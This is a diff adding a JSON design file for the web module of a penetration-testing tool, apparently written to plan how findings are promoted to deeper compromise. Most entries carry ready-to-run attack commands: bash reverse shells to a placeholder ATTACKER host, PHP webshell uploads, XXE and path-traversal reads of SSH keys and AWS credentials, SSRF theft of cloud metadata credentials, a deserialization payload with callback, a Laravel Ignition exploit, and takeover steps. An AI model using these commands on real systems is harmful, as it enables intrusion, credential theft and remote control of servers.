@@ -1,0 +1,397 @@
+{
+  "service": "web",
+  "module_files": [
+    "recce/services/web/__init__.py",
+    "recce/services/web/http.py",
+    "recce/services/web/checks.py",
+    "recce/services/web/crawl.py",
+    "recce/services/web/auth.py",
+    "recce/services/web/deserial.py",
+    "recce/services/web/loot.py",
+    "recce/services/web/discover.py",
+    "recce/services/web/wordlists.py"
+  ],
+  "summary": "The web/ package is the deepest module in recce: crawl \u2192 inject (SQLi/CMDi/SSRF/LFI/SSTI/reflected-XSS/open-redirect/BOLA/CSRF), JWT alg:none forge + HS crack + RS256\u2192HS256 confusion, PHP/Java/ViewState deserial marker detection, upload+webshell proof, cache-poison, smuggle, XXE, NoSQL auth bypass, actuator/heapdump, .git reconstruction with credential mining, source-map recovery, framework-default-cred POSTs (Grafana/MinIO/Basic). Already reaches T3 in a few places (form/basic default creds accepted, JWT HS-secret cracked \u2192 forge, .git dump \u2192 creds). Biggest gap: no chaining from a T3 credential capture into an authenticated re-scan, and the JWT alg-confusion 'forged token minted' path stops at T2 without automatically replaying against a token-gated path.",
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "loot_credentials",
+    "known_hostnames",
+    "product_versions",
+    "known_paths",
+    "spraycreds_queue"
+  ],
+  "findings": [
+    {
+      "kind": "web-git-dump",
+      "title_pattern": "Exposed .git reconstructed - source tree + secrets recovered",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "Reconstructs actual git objects, extracts blobs, mines files for _URL_CRED_RE/_ENV_PASS_RE and pushes Credential objects to the store \u2014 extracted material, not fingerprint.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-spray captured creds against SSH/RDP/DB/web-basic same-subnet; already partially wired via credential store. Push the source tree through offline secret-scanner (trufflehog rules) for wider hits.",
+      "promotion_risk": "medium",
+      "tester_next_step": "git-dumper http://IP:PORT/.git /tmp/gd && cd /tmp/gd && trufflehog filesystem . --json | jq '.Raw' ; for pair in $(grep -Eho '[a-z_]+:[^@/]+@' -r .); do echo $pair; done"
+    },
+    {
+      "kind": "web-jwt",
+      "title_pattern": "JWT HMAC secret cracked / alg:none accepted / RS\u2192HS confusion",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "For HS-cracked, the offline HMAC check IS the secret (no FP); for alg:none 'confirmed' the forged token was replayed and matched the authenticated response \u2014 proven forgery.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-forge an admin-claims token and replay against every discovered admin/API path from the crawl to prove privilege escalation \u2192 T3 session hijack.",
+      "promotion_risk": "medium",
+      "tester_next_step": "jwt_tool <token> -C -d rockyou.txt ; jwt_tool <token> -X a -pc admin -pv true ; curl -H 'Authorization: Bearer <forged>' http://IP:PORT/api/admin/users",
+      "related_cves": [
+        "CVE-2015-9235"
+      ]
+    },
+    {
+      "kind": "web-actuator-heapdump",
+      "title_pattern": "Actuator heapdump downloadable",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "Content-type octet-stream / HPROF magic validated \u2014 actual heap bytes.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-strings the hprof, extract JDBC URLs / Bearer tokens / passwords with the loot regex set and fold into credential store; then reuse those against DB modules.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk -o heap.hprof http://IP:PORT/actuator/heapdump && strings heap.hprof | grep -Ei 'jdbc:mysql://|password=|Bearer [A-Za-z0-9._-]{30,}' | sort -u | head -60"
+    },
+    {
+      "kind": "web-nosqli",
+      "title_pattern": "NoSQL injection authentication bypass",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "$ne/$gt operator submitted and redirect/session-cookie divergence from wrong-cred baseline \u2014 actual login bypass proven.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Capture the session cookie from the bypass response and hand it back to scan_endpoint auth={Cookie:...} for an authenticated re-scan \u2014 the bypass becomes a foothold.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk -c cook.txt -X POST -d 'user[$ne]=x&pass[$ne]=x' http://IP:PORT/login ; curl -sSk -b cook.txt http://IP:PORT/dashboard"
+    },
+    {
+      "kind": "web-xxe",
+      "title_pattern": "XML External Entity (XXE) file read via <path>",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "_XXE_HIT confirms /etc/passwd or win.ini content actually returned \u2014 proven file read via server-side parser.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Follow up with /root/.ssh/id_rsa, /home/*/.ssh/id_rsa, /var/www/*/.env, /proc/self/environ reads \u2014 captured SSH key \u2192 SSH pivot is T3.",
+      "promotion_risk": "low",
+      "tester_next_step": "for f in /root/.ssh/id_rsa /home/ubuntu/.ssh/id_rsa /root/.aws/credentials /var/www/html/.env /proc/self/environ; do curl -sSk -X POST -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://'$f'\">]><r>&x;</r>' http://IP:PORT/api ; done"
+    },
+    {
+      "kind": "web-upload-rce",
+      "title_pattern": "Unrestricted file upload to <engine> code execution",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "Uploads server-computed marker (tag+7*7=49) and confirms marker in GET response \u2014 actual execution proven.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Once RCE marker seen, drop a real reverse shell (bash tcp connect / socat) \u2014 that is the T3 foothold; already gated on --upload-shell so cleanup is user-managed.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sSk -F 'file=@shell.php' http://IP:PORT/upload.php ; curl -sSk 'http://IP:PORT/uploads/shell.php?cmd=bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' # nc -lvnp 4444 on ATTACKER first"
+    },
+    {
+      "kind": "web-cmdi",
+      "title_pattern": "OS command injection in <where> (output/time-based)",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "cmdi<computed> marker only appears when shell arithmetic $((a*b)) evaluates \u2014 plain reflection cannot false-positive.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Follow the proven marker with `id;uname -a;cat /etc/shadow` (privileges permitting) and drop an SSH pubkey / reverse shell \u2014 T3 foothold.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sSk 'http://IP:PORT/api/ping?host=1.1.1.1;id' ; curl -sSk 'http://IP:PORT/api/ping?host=1.1.1.1;bash -c \"bash -i >%26 /dev/tcp/ATTACKER/4444 0>%261\"'"
+    },
+    {
+      "kind": "web-ssrf",
+      "title_pattern": "Server-Side Request Forgery via <where>",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "Cloud-metadata AccessKeyId / GCP JWT / Azure vmId markers confirmed in response body with baseline check ruling out echo \u2014 actual server-side fetch proven.",
+      "can_promote_to": "t3",
+      "promotion_notes": "IMDS -> IAM role -> AWS session; capture the temporary credentials, run aws sts get-caller-identity + list-buckets \u2192 T3 cloud foothold.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk 'http://IP:PORT/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' ; ROLE=$(curl above) ; curl -sSk 'http://IP:PORT/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'$ROLE ; export AWS_ACCESS_KEY_ID=... ; aws s3 ls"
+    },
+    {
+      "kind": "web-lfi",
+      "title_pattern": "Path traversal / local file read via <where>",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "_TRAVERSAL_HIT confirms actual /etc/passwd or win.ini content returned.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Read SSH private keys / /proc/self/environ / /var/www/*/.env; register captured creds/keys and pivot via SSH.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk 'http://IP:PORT/download?file=../../../../root/.ssh/id_rsa' | tee id_rsa && chmod 600 id_rsa && ssh -i id_rsa root@IP"
+    },
+    {
+      "kind": "web-ssti",
+      "title_pattern": "Server-Side Template Injection \u2014 <engine> (RCE)",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "Marker 49 from 7*7 or 7777777 from 7*'7' proves template evaluation; engine identification narrows RCE payload.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Fire the engine's canonical RCE payload from _SSTI_ENGINES and capture command output; drop a reverse shell \u2192 T3.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sSk 'http://IP:PORT/?msg={{cycler.__init__.__globals__.os.popen(\"id\").read()}}' # Jinja2 ; adjust per identified engine"
+    },
+    {
+      "kind": "web-sqli",
+      "title_pattern": "SQL injection in <where> (error/boolean/time)",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Error signature match / boolean divergence / time delta scaling with sleep arg \u2014 deterministic, but no data-extraction step is native.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Hand the confirmed injection point to sqli.py.run_sqlmap (already implemented, gated) for schema/dump \u2014 T2 proof of read; a captured admin hash \u2192 crack \u2192 T3.",
+      "promotion_risk": "high",
+      "tester_next_step": "sqlmap -u 'http://IP:PORT/product?id=1' --batch --risk=3 --level=5 --dbs ; sqlmap -u '...' -D app -T users --dump ; hashcat -m 1400 hashes /usr/share/wordlists/rockyou.txt"
+    },
+    {
+      "kind": "web-methods PUT proven",
+      "title_pattern": "Arbitrary file write via HTTP PUT (proven)",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "_prove_put PUTs a canary, GETs it back, DELETEs it \u2014 roundtrip proves write capability.",
+      "can_promote_to": "t3",
+      "promotion_notes": "If PUT is proven AND server maps script extensions, PUT a webshell (piggyback on _SHELLS from webdav.py) and get RCE \u2192 T3.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sSk -X PUT --data '<?php system($_GET[c]); ?>' http://IP:PORT/shell.php ; curl -sSk 'http://IP:PORT/shell.php?c=id'"
+    },
+    {
+      "kind": "web-default-creds",
+      "title_pattern": "Default HTTP Basic / Grafana / MinIO credentials accepted",
+      "tier": "t3",
+      "severity": "critical",
+      "tier_evidence": "_basic_auth_defaults confirms a real HTTP 200 (not just a redirect); _APP_LOGINS require a real session/token artifact \u2014 actual foothold established.",
+      "can_promote_to": "t4",
+      "promotion_notes": "With Grafana admin: read data-source connection strings (DB creds), issue new admin API tokens; with MinIO admin: list all buckets and download SSE-C data. Feed captured DB creds back to db/* modules.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk -u admin:admin http://IP:PORT/api/datasources ; # extract dbUri from response, then: recce scan --mysql <dbuser>:<dbpass>@<dbhost>"
+    },
+    {
+      "kind": "web-jenkins-script",
+      "title_pattern": "Jenkins Script Console reachable unauthenticated (Groovy RCE)",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "Signature match on 'Script Console' / 'Jenkins.instance' \u2014 a POST of Groovy from an unauth /script IS RCE.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Submit a Groovy `Runtime.getRuntime().exec(...)` payload to /scriptText \u2014 output-based RCE is T3.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sSk --data-urlencode \"script=println 'id'.execute().text\" http://IP:PORT/scriptText # then bash reverse shell payload"
+    },
+    {
+      "kind": "web-grafana-lfi",
+      "title_pattern": "Grafana plugin path traversal (CVE-2021-43798)",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "Regex confirms root:...:0:0: in body \u2014 actual /etc/passwd read via known CVE.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Read /etc/grafana/grafana.ini (admin_password), then log in with those creds \u2014 T3 foothold via credentialed panel.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk 'http://IP:PORT/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini' | grep -Ei 'admin_password|secret_key' ; login \u2192 follow web-default-creds datasource extraction",
+      "related_cves": [
+        "CVE-2021-43798"
+      ]
+    },
+    {
+      "kind": "web-ignition",
+      "title_pattern": "Laravel Ignition debug endpoint exposed (CVE-2021-3129)",
+      "tier": "t1",
+      "severity": "critical",
+      "tier_evidence": "Detects presence of Ignition; exploitation (log-poison) not attempted.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Fire the actual CVE-2021-3129 exploit-solution POST body (make-viewable-file / log poisoning) \u2014 captured command output = T3 RCE.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "python3 -c \"import requests; r=requests.post('http://IP:PORT/_ignition/execute-solution', json={'solution':'Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution','parameters':{'variableName':'a','viewFile':'phar:///var/www/storage/logs/laravel.log'}})\"",
+      "related_cves": [
+        "CVE-2021-3129"
+      ]
+    },
+    {
+      "kind": "web-cache-poison",
+      "title_pattern": "Web cache poisoning via unkeyed header",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Requires BOTH reflection AND a positive cache signal (X-Cache/Age/max-age) \u2014 deterministic when both fire.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Add a second identical GET without the poisoning header within cache TTL; if the response still contains the canary, the poison IS live (T2 proof).",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -sSk -H 'X-Forwarded-Host: attacker.tld' http://IP:PORT/ ; sleep 2 ; curl -sSk http://IP:PORT/ | grep -c attacker.tld  # >0 \u2192 confirmed poison"
+    },
+    {
+      "kind": "web-oauth-bypass",
+      "title_pattern": "Open redirect via <param>",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "3xx Location contains attacker canary \u2014 deterministic.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Client-side/OAuth-code-theft primitive; no server foothold.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSk -D- 'http://IP:PORT/oauth/authorize?redirect_uri=https://attacker.tld/cb&client_id=X' | grep -i location"
+    },
+    {
+      "kind": "web-bola",
+      "title_pattern": "BOLA / IDOR: incrementing an id parameter returns different content",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Diff two shifted ids against baseline with a 0.30-0.98 similarity window \u2014 deterministic same-template-different-data.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Enumerate a numeric-range sweep (1..500) and hash bodies; count of distinct 200-OK bodies = data-extraction proof (T2).",
+      "promotion_risk": "medium",
+      "tester_next_step": "for i in $(seq 1 500); do curl -sSk -o /tmp/i$i http://IP:PORT/api/user?id=$i; done ; md5sum /tmp/i* | awk '{print $1}' | sort -u | wc -l"
+    },
+    {
+      "kind": "web-cors",
+      "title_pattern": "CORS reflects arbitrary Origin / null Origin with credentials",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Reflection + Allow-Credentials:true deterministic.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Client-side XS-read; no server foothold.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSk -H 'Origin: https://attacker.example' -D- http://IP:PORT/api/me | grep -i access-control"
+    },
+    {
+      "kind": "web-smuggle",
+      "title_pattern": "HTTP request smuggling (CL.TE/TE.CL desync, timing)",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Two-shot timing stall vs baseline is a strong signal but only proves parser divergence, not weaponised smuggling.",
+      "can_promote_to": "t2",
+      "promotion_notes": "With user consent, send a real smuggled prefix-request that fetches /admin unauthenticated on the pooled connection \u2014 behind-load-balancer proof is T2.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "smuggler -u http://IP:PORT/ -t 6 ; or hand-craft in Burp Repeater: POST with both CL and TE and observe the second victim's response"
+    },
+    {
+      "kind": "web-hardcoded-secret",
+      "title_pattern": "Hardcoded <kind> in JavaScript",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "Regex extraction of secret string in JS body \u2014 actual credential material captured (though redacted for output).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Register captured token as Credential(kind=api-token) and probe the vendor API (AWS STS, GitHub /user, Stripe /balance) for validity \u2192 T3 identity confirmation.",
+      "promotion_risk": "medium",
+      "tester_next_step": "TOKEN=$(...) ; curl -sSk -H \"Authorization: Bearer $TOKEN\" https://api.stripe.com/v1/balance ; aws sts get-caller-identity"
+    },
+    {
+      "kind": "web-sourcemap",
+      "title_pattern": "Exposed JavaScript source map - original source recovered",
+      "tier": "t2",
+      "severity": "medium",
+      "tier_evidence": "sourcesContent parsed, files reconstructed, gitdump._mine extracts credentials into store.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Same pathway as web-git-dump \u2014 auto-spray captured API keys and DB URIs against known services.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk http://IP:PORT/static/js/main.abc123.js.map | jq -r '.sourcesContent[]' | grep -Ei 'api[_ ]?key|secret|password'"
+    },
+    {
+      "kind": "web-deserial",
+      "title_pattern": "Java/PHP serialized object / ViewState in client-controllable data",
+      "tier": "t0",
+      "severity": "high",
+      "tier_evidence": "Detects marker (rO0AB, O:N:, ViewState FF01) only \u2014 proves the sink exists, not that a gadget lands.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Send a ysoserial/PHPGGC probe payload with a DNS/HTTP callback to confirm deserialization execution \u2192 T2 (or T3 with a real command).",
+      "promotion_risk": "high",
+      "tester_next_step": "ysoserial CommonsCollections5 'curl http://ATTACKER/hit' | base64 -w0 ; curl -sSk --cookie 'JSESSIONID=<payload>' http://IP:PORT/  # watch ATTACKER server for callback"
+    },
+    {
+      "kind": "web-content",
+      "title_pattern": "<title> (/<word>)",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Wordlist hits filtered against baseline-404 shape \u2014 deterministic exposure.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For high-value exposures (config.php, .env.bak, dump.sql) auto-download + mine \u2192 T2.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk http://IP:PORT/dump.sql | head -200 ; grep -Ei 'CREATE TABLE users|INSERT INTO' /tmp/dump.sql"
+    },
+    {
+      "kind": "web-takeover",
+      "title_pattern": "Potential subdomain takeover (<service>)",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Fingerprint match on the platform's 'unclaimed' error page.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Claim the resource on the fingerprinted platform (S3 bucket, GitHub Pages, Heroku app) with the exact name \u2192 serve attacker content on the victim domain = T3 identity takeover.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "case $SVC in AWS S3) aws s3api create-bucket --bucket VICTIM ; GitHub Pages) create repo VICTIM/VICTIM.github.io ; Heroku) heroku create VICTIM ;; esac"
+    },
+    {
+      "kind": "web-cookie",
+      "title_pattern": "Cookie without HttpOnly/Secure/SameSite",
+      "tier": "t0",
+      "severity": "low",
+      "tier_evidence": "Header-attribute audit; no exploitation.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Hygiene finding.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSkI http://IP:PORT/ | grep -i set-cookie"
+    },
+    {
+      "kind": "web-security-headers / web-csp",
+      "title_pattern": "Missing / weak security headers",
+      "tier": "t0",
+      "severity": "medium",
+      "tier_evidence": "Header presence/parse only.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Hygiene.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSkI http://IP:PORT/ | grep -Ei 'content-security|x-frame|strict-transport'"
+    },
+    {
+      "kind": "web-null-byte",
+      "title_pattern": "Null byte injection (file disclosure)",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "_PASSWD_RE matches real /etc/passwd format (root:...:0:0:) \u2014 proven file read.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Same as web-lfi \u2014 read SSH keys and pivot.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk 'http://IP:PORT/view?file=../../etc/passwd%00.jpg' ; curl -sSk 'http://IP:PORT/view?file=../../root/.ssh/id_rsa%00.jpg' > loot.key"
+    },
+    {
+      "kind": "web-admin-panel",
+      "title_pattern": "Admin/Management panel discovered at <path>",
+      "tier": "t0",
+      "severity": "medium",
+      "tier_evidence": "Path enumeration with SPA-baseline filter \u2014 surface only.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Feed to _basic_auth_defaults / _form_login_defaults / hydra with rockyou \u2192 T3 if a default cred lands.",
+      "promotion_risk": "medium",
+      "tester_next_step": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f http-post-form 'IP:/admin/login:user=^USER^&pass=^PASS^:F=invalid'"
+    },
+    {
+      "kind": "web-actuator-env / -configprops",
+      "title_pattern": "Actuator /env|/configprops exposed",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "extract=True path fetches body and runs _leaked_secrets \u2014 actual secret content captured.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Parse JDBC URL from env and register as db credential; recce db/* modules then auth-scan the DB directly.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk http://IP:PORT/actuator/env | jq -r '..|.value?//empty' | grep -Ei 'jdbc:|password|Bearer'"
+    },
+    {
+      "kind": "web-vhost",
+      "title_pattern": "Virtual host(s) discovered",
+      "tier": "t0",
+      "severity": "info",
+      "tier_evidence": "Host-header probing; surface only.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Re-run scan_endpoint with Host: <vhost> \u2014 each vhost is a fresh attack surface.",
+      "promotion_risk": "none",
+      "tester_next_step": "for vh in $(cat vhosts.txt); do curl -sSk -H \"Host: $vh\" http://IP:PORT/ ; done"
+    },
+    {
+      "kind": "web-csrf / web-form-unfuzzed / web-cleartext-login",
+      "title_pattern": "CSRF/cleartext form hygiene",
+      "tier": "t0",
+      "severity": "low",
+      "tier_evidence": "Form structural inspection only.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Hygiene.",
+      "promotion_risk": "none",
+      "tester_next_step": "n/a \u2014 operator note"
+    }
+  ]
+}
